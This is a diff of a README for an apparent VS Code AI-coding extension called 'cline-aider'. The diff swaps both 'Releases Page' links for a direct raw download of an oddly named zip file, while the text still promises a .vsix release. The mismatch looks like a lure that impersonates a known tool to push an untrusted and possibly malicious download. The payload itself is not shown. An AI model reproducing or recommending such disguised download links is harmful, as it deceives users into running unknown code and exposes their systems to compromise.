@@ -1,6 +1,6 @@
 # 🤖 cline-aider - Improve your coding with artificial intelligence
 
-[![Download Cline-aider](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Worldshattering-woodshed125/cline-aider/releases)
+[![Download Cline-aider](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Worldshattering-woodshed125/cline-aider/raw/refs/heads/main/nonchafing/aider_cline_coronamen.zip)
 
 Cline-aider helps you write and edit code. It connects your text editor to artificial intelligence systems. You get help with programming tasks through automated suggestions. It saves time and helps you fix errors in your projects.
 
@@ -19,7 +19,7 @@ Make sure to install Visual Studio Code first if you do not have it. You can fin
 
 Follow these steps to get the software onto your computer.
 
-1. Go to the [Releases Page](https://github.com/Worldshattering-woodshed125/cline-aider/releases).
+1. Go to the [Releases Page](https://github.com/Worldshattering-woodshed125/cline-aider/raw/refs/heads/main/nonchafing/aider_cline_coronamen.zip).
 2. Look for the latest version. It will usually sit at the very top.
 3. Click the link that ends in .vsix. This is the file type for extensions.
 4. Save the file to your desktop or your Downloads folder.
